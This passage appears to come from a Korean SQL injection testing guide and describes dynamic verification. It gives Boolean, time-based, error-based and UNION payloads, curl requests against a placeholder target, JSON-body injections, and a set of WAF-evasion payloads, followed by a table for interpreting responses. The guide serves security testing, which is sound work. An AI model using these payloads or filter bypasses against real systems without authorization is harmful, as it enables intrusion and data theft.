### Phase 2: 동적 테스트 (검증)


**테스트 방법:**
1. curl로 SQL Injection 페이로드가 포함된 요청을 전송
2. 응답에서 SQL 에러 메시지, 데이터 유출, 또는 비정상적인 동작을 확인

**안전한 페이로드 (읽기 전용, 데이터 변경 없음):**

Classic SQLi 테스트:
- `' OR '1'='1` — 기본 Boolean 테스트
- `' OR '1'='1' --` — 주석으로 나머지 쿼리 무효화
- `1 UNION SELECT NULL,NULL,NULL --` — 컬럼 수 확인
- `' AND 1=1 --` / `' AND 1=2 --` — Boolean 기반 (응답 차이 비교)

Blind SQLi 테스트:
- `' AND SLEEP(3) --` (MySQL) — 시간 기반
- `' AND pg_sleep(3) --` (PostgreSQL) — 시간 기반
- `'; WAITFOR DELAY '0:0:3' --` (MSSQL) — 시간 기반

Error 기반:
- `'` — 단일 따옴표로 SQL 에러 유발 여부 확인
- `1'` — 숫자 파라미터에 따옴표 삽입

**curl 예시:**
```
# 기본 Boolean 테스트
curl "https://target.com/api/users?id=1'+OR+'1'%3D'1"

# 시간 기반 Blind 테스트
curl "https://target.com/api/users?id=1'+AND+SLEEP(3)+--+"

# 에러 유발 테스트
curl "https://target.com/api/users?id=1'"
```

**WAF 우회 페이로드 (기본 페이로드 차단 시):**
```
# 인라인 주석 (MySQL)
curl "https://target.com/api/users?id=1'/*!50000OR*/'1'%3D'1"

# 공백 대체 (%09 탭, %0a 줄바꿈)
curl "https://target.com/api/users?id=1'%09OR%091%3D1--"

# 대소문자 혼합
curl "https://target.com/api/users?id=1'+oR+'1'%3D'1"

# Double encoding
curl "https://target.com/api/users?id=1%2527+OR+%25271%2527%253D%25271"

# CONCAT/CHR 함수로 문자열 생성 (키워드 필터 우회)
curl "https://target.com/api/users?id=1'+AND+1%3DCONVERT(INT,CHAR(49))--"

# 과학적 표기법 (숫자 필터 우회)
curl "https://target.com/api/users?id=0e1'+union+select+null,null--"
```

**JSON 바디 테스트 (REST API):**
```
curl -X POST "https://target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -d '{"id":"1'\'' OR '\''1'\''='\''1"}'

# 숫자 파라미터
curl -X POST "https://target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -d '{"id":"1 AND SLEEP(3)"}'
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| SQL 에러 문자열: `syntax error`, `ORA-`, `MySQL`, `Unclosed quotation mark`, `pg_query` | 확인됨 (Error-based) |
| Boolean 참/거짓 조건에서 응답 길이/내용 유의미한 차이 | 확인됨 (Boolean-based) |
| Time-based: 기준선 대비 3초+ 지연 (3회 반복 일관) | 확인됨 (Time-based) |
| UNION SELECT로 추가 데이터 반환 | 확인됨 (UNION-based) |
| 400 Bad Request + `invalid input syntax` | 안전 (파라미터화된 쿼리, 타입 검증) |
| 입력이 그대로 반영된 에러 (SQL 실행 아닌 입력 표시) | 안전 |
| WAF 차단 (403 + 보안 벤더 시그니처) | 우회 기법 시도 |

**검증 기준:**
- **확인됨**: 동적 테스트로 SQL 에러 메시지가 반환되거나 Boolean/Time 기반으로 쿼리 조작이 확인됨
